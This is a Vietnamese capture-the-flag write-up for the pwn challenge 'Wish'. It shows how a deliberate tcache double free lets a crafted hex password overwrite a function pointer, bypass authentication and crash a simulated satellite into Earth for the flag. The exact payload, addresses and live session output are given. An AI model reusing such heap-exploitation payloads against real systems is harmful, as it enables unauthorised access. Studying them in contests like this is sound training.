# Wish - pwn (800 điểm)

**Cờ:** `cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}`
**Tài liệu:** `files/client` (679.960 B, SHA256 `ae308ff5a34c76e60455e5acbd69d7db993cd67fde038d854e114570424d0394`), `files/auth.hh` (2.572 B, SHA256 `556d461e786eca2592521a7812a21f4b9ba9dc4bb9c1aafa61b5de34ab14ba2b`), `files/cmd_auth.hh` (653 B, SHA256 `fe6ac65e7efbc9343065a73a76a634261b04e36e294917f2b55c522bb2f2fda1`)
**Tác giả đề:** phlox

## Đề bài

Đề cấp một phần source của hệ điều khiển vệ tinh (`auth.hh`, `cmd_auth.hh`) và binary `client`. Mục tiêu ghi trên thẻ là làm vệ tinh đâm vào Earth.

Instance là một ttyd chạy đúng một lệnh, không có shell:

```text
/bin/sh -c exec env LD_PRELOAD=/opt/wish/shim.so /opt/wish/client /tmp/sat.sock (b92d58887f29)
connected. type HELP for commands.
```

Kiến trúc suy ra từ log: server mô phỏng giữ trạng thái thế giới (vị trí, vận tốc, nhiên liệu) và dùng chung giữa mọi kết nối; client giữ trạng thái phiên, trong đó có cờ `authed`. Mỗi kết nối WebSocket spawn một process client mới, nên mọi thứ phải nằm trong một kết nối. Client chỉ nhận 7 lệnh: `STATUS`, `AUTHENTICATE`, `THRUST <name> <x> <z>`, `STOP <name>`, `INFO <name>`, `HELP`, `QUIT`.

## Phân tích

Triage (`analysis/triage.txt`): `Type: EXEC` nên không PIE, text nằm cố định từ `0x400000`; `GNU_STACK RW` tức NX bật; RELRO chỉ phủ tới `0x40d000` trong khi `.got.plt` trải đến `0x40d258` và không có `BIND_NOW`, tức Partial RELRO; binary có `debug_info` và not stripped nên đọc được từng hàm trong namespace `sat::client`. Imports đáng chú ý: `malloc`/`free`, `popen`/`pclose` (đường gnuplot của `STATUS`), `strtod`, `strncmp`, `dlsym`.

Ba dòng trong source quyết định hướng đi.

```cpp
struct auth_sess
{
   char head[24];
   void (*dbg)(session&); // sizeof(ptr) on 64 bit systems?
   char tail[32];
};
```

`auth_sess` vừa 64 byte, `dbg` ở offset 24, tức cả struct nằm trọn trong allocation 64 byte. Kích thước chunk gồm metadata phụ thuộc allocator.

```cpp
void contrivance(session& s)
{
   auth_sess* dbg_sess = (auth_sess*)malloc(sizeof(auth_sess));
   auth_sess* dbg_ses2 = (auth_sess*)malloc(sizeof(auth_sess));
   asm volatile("" : : "r"(dbg_sess), "r"(dbg_ses2) : "memory");
   free(dbg_sess);
   free(dbg_ses2);
   free(dbg_sess);
}
```

`get_password()` decode tối đa 128 ký tự hex thành 64 byte vào `malloc(64)`. `check_password()` gọi `malloc(64)` cho `dummy` rồi `malloc(64)` cho `real_auth_sess`, và `if (real_auth_sess->dbg != NULL) real_auth_sess->dbg(s);`.

Chuỗi cấp phát trong một lệnh `AUTHENTICATE` (`authenticate` 0x40492f → `contrivance` 0x403a86 → `get_password` 0x404061 → `check_password` 0x4047ae) pop tcache theo đúng thứ tự: `password` = A, `dummy` = B, `real_auth_sess` = A. Chunk chứa mật khẩu cũng là chunk mà `dbg` được nạp vào `rax`. Payload hex vì thế điều khiển trực tiếp con trỏ hàm ở offset 24, và hàm đó nhận `s` làm đối số duy nhất.

Hai hằng số lấy từ binary: `auth_bypass_dbg` ở `0x403ac9`, và đối số của nó là `session&` nên `mov BYTE PTR [rdi+0x28],0x1` cho thấy `authed` nằm ở offset `0x28`. Vì không PIE, `0x403ac9` không đổi giữa các lần chạy.

Điều kiện in cờ nằm ở `vanished_alerts` (0x408120), hàm duy nhất in cờ:

```asm
  4082c9:  lea    rdi,[rsp+0x1f0]
  4082d6:  mov    esi,0x409553          ; "/flag.txt"
  4082f7:  mov    esi,0x409831          ; "\nCONGRATULATIONS: "
```

Nó so snapshot body của hai lần `STATUS` liên tiếp; với mỗi body có trong lần trước mà không có trong lần sau, nó in `[ALERT] <name> is gone since the last STATUS; probable collision with <khác> (last seen gap <d>)` rồi đọc `/flag.txt` và in `CONGRATULATIONS: <cờ>`. Nhánh in cờ nằm sau `test r15,r15; je ...` ở `0x408263`, tức cần ít nhất một body còn sống trong snapshot mới.

`INFO` trên instance: Earth ở `(0,0,0)` radius 20 `mass: 0`, Satellite ở `(50,0,0)` radius 5 `mass: 1`, velocity `(0,0,0)`. `mass 0` kèm vận tốc không đổi giữa các lệnh không cho thấy tác động hấp dẫn trong các phép đo đã ghi; muốn chạm thì phải tự đẩy.

## Hướng đã thử

1. **Đoán mật khẩu**: `check_password` chỉ so `strlen(flag) == strlen(password)` rồi `strncmp` toàn bộ, phản hồi duy nhất là `authenticated` hoặc `authentication failed`, không có oracle vị trí sai.
2. **Biến `dbg` thành RCE rồi đọc `/flag.txt`**: libc, heap và stack vẫn ASLR (binary link động), NX bật, và không có lệnh nào in ra một con trỏ. Primitive chỉ là `call [chunk+0x18]` với đối số `&session`.
3. **Nhảy vào `popen@plt`**: `popen` có thật trong imports (gnuplot), nhưng lệnh gọi ở `0x404810` là `mov rdi,rbx; call rax` với `rbx = &session` trên stack của `main`, không phải chunk payload, nên không có chuỗi lệnh để đưa vào.
4. **`shim_flush_class` trung hoà double free**: wrapper `maybe_flush_shim_class` ở `0x403fd4` resolve tên qua `dlsym(RTLD_DEFAULT, "shim_flush_class")` (chuỗi `0x409502`), và lời gọi ở `0x40489a` nằm cuối `check_password`, sau khi `dbg` đã chạy và `password` đã free.
5. **glibc >= 2.34 sẽ abort vì double free**: binary yêu cầu `__libc_start_main@GLIBC_2.34` và `dlsym@GLIBC_2.34`, mà `_int_free` từ 2.29 in `free(): double free detected in tcache 2`. Thực đo trên instance cho thấy chunk A vẫn được cấp lại trong cùng một lệnh và không có abort. Hướng này vẫn chạy được; lý do cụ thể (shim.so được `LD_PRELOAD`) chưa xác minh vì box không có shell để đọc `/opt/wish/shim.so`.
6. **Chờ thế giới tự hồi phục hoặc ra lệnh reset**: `ECHO` trả `unknown command: ECHO (type HELP)`, bảng dispatch (0x408d6b) chỉ 7 lệnh, và vị trí vệ tinh tiếp tục tăng đơn điệu qua 5 kết nối mới (`-39048`, `-45188`, `-52655`, `-197933`). Loại, phải xin instance mới.

## Lời giải

**Bước 1 - Dựng payload 32 byte.** Lấp `head[24]` rồi ghi địa chỉ `auth_bypass_dbg` vào `dbg`, little-endian. `memset(password, 0, 64)` đã có sẵn nên không cần lấp phần đuôi.

```python
# 24 byte head[24] + 8 byte con tro ham 0x403ac9 (auth_bypass_dbg)
PAYLOAD = "41" * 24 + "c93a400000000000"   # 64 ky tu hex
```

**Bước 2 - Một lệnh `AUTHENTICATE` trên world còn nguyên.** Server nhận `password`, `check_password` pop A lần hai, `dbg` != 0, `auth_bypass_dbg(s)` đặt `s.authed = 1` tại `[rdi+0x28]`. `check_password` trả `result || s.authed`, in `authenticated`, và `THRUST` chuyển từ bị chặn sang `OK`.

```text
> AUTHENTICATE
Enter password (hex-encoded): 414141414141414141414141414141414141414141414141c93a400000000000
auth forced via dbgauthenticated
> THRUST Satellite -1 0
OK
```

**Bước 3 - Đâm và quan sát trong cùng kết nối.** Điều kiện thắng là một body biến mất giữa hai lần `STATUS`, nên thứ tự bắt buộc là `STATUS` (snapshot nền) → `THRUST Satellite -1 0` → poll `STATUS`. Khoảng 0.7 s mỗi lần poll là đủ vì va chạm tới trong ~2 s thực; server chạy 10 nhịp mỗi giây thực, đo được từ `1705.507 / 68.220297 = 25.0` s sim trong 2.5 s.

```bash
python exploit.py wss://<instance-id>.i.cdctf.net/ws
```

```text
> AUTHENTICATE
Enter password (hex-encoded): 414141414141414141414141414141414141414141414141c93a400000000000
auth forced via dbgauthenticated
> STATUS
> THRUST Satellite -1 0
OK
> STATUS
[ALERT] Earth is gone since the last STATUS; probable collision with Satellite (last seen gap 0.332567)
CONGRATULATIONS: cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}
```

**Kiểm chứng.** Kết quả được đối chiếu ở ba điểm. Primitive: `auth forced via dbg` là chuỗi chỉ in ra từ `auth_bypass_dbg`, và `0x403ac9` là địa chỉ cố định của nó trong binary không PIE. Vật lý: `mass` đi `1 → 0.75 → 0.5` kèm `velocity` `0 → -28.293854944373365 → -68.220297140345764` khớp phương trình rocket `v = ve*ln(m0/m)` với `ve ~ 98.4` (`28.29/ln(4/3) = 98.32`, `68.22/ln 2 = 98.44`), nên `-1 0` luôn đốt hết delta-v 68.22 và vệ tinh đi từ `x=50` vào vùng `|x| < 25` của Earth. Cửa sổ in cờ: nhánh `CONGRATULATIONS` chỉ chạy khi còn body trong snapshot mới (`test r15,r15` ở `0x408263`), đúng cấu hình Earth bị nuốt còn Satellite sống.

Kết quả phụ đã đo: va chạm xoá body nhẹ hơn. Sau pha bay xuyên ở kết nối đầu, `INFO Earth` trả `ERR no such body Earth` và `STATUS` chỉ còn vòng tròn nhãn `Satellite`, thế giới không còn đủ hai body nên không tạo được va chạm thứ hai. Nhiên liệu cũng cạn vĩnh viễn (`mass` kẹt ở `0.49999999999999994`, `THRUST` trả `OK` nhưng `velocity` không đổi). Instance đầu tiên vì thế hết dùng được và phải xin subdomain mới; lần lấy cờ chạy trên instance thứ hai.

## Kết quả

```bash
python exploit.py wss://sbrktohj.i.cdctf.net/ws
```

```text
CONGRATULATIONS: cdctf{W!sh_Up0n_A_Sh0ot1ng_Star_81ab9a33}
```

Cờ khớp định dạng `cdctf{...}` của đề, đã lưu trong `flag.txt`. Bản `exploit.py` trong case này là bản đã dọn của script chạy thật; hai instance đều đã hết hạn nên chưa chạy lại bản dọn, các block `text` ở trên là output nguyên văn từ phiên live (xem `analysis/live_session.log`).

## Tái hiện

```bash
pip install websockets
python exploit.py wss://<instance-id>.i.cdctf.net/ws   # ID lay tu the challenge
```

Điều kiện để chạy lại được:

```bash
# the gioi phai con du 2 body va c du nhien lieu
> INFO Earth        # phai tra vi tri, khong phai ERR no such body Earth
> INFO Satellite    # mass phai la 1
```

Nếu `INFO Earth` báo `ERR no such body Earth`, thế giới đã bị một lần đâm trước đó dùng mất, phải reset instance để lấy subdomain mới. Toàn bộ chuỗi phải đi trong một kết nối: `authed` thuộc process client, còn trạng thái thế giới thuộc server và sống lâu hơn kết nối.

Giao diện ttyd tự động hoá được: `GET /token` trả `{"token": ""}`, WebSocket ở `wss://<id>.i.cdctf.net/ws` với subprotocol `tty`, frame đầu tiên là text `{"AuthToken": "", "columns": N, "rows": N}`, phím gửi đi là frame nhị phân `'0' + du_lieu`, output là các frame bắt đầu bằng `'0'`. Lưu ý mọi response của `*.i.cdctf.net` kèm hai header `X-LLM-Agent-Instruction` và `X-LLM-Policy` cấm công cụ AI tương tác với instance, nên người chơi tự gõ lệnh; `exploit.py` ở đây chỉ là bản mô tả tái lập.
